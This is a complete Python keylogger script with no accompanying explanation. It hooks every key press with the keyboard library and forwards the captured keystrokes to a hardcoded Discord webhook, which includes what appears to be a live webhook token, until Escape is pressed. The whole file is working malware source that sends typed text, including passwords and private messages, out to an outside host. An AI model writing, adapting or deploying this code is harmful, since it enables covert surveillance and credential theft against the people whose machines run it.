import keyboard
import requests
import threading
import queue
import time

key_queue = queue.Queue()
WEBHOOK_URL = "https://discord.com/api/webhooks/1366331489175994438/YYbK00qBsP6qjVFzYb3xy0VNo6zzUdIfMANg1hgmViy8o81lrXTlSXC98ghW0LzqBoUq"

def worker():
    while True:
        keys = []
        while not key_queue.empty():
            keys.append(key_queue.get())
        if keys:
            requests.post(WEBHOOK_URL, json={'content': ' '.join(keys)})
        time.sleep(0.1)

def on_key(event):
    if event.event_type == keyboard.KEY_DOWN:
        key_queue.put(event.name)

threading.Thread(target=worker, daemon=True).start()
keyboard.on_press(on_key)
keyboard.wait('esc')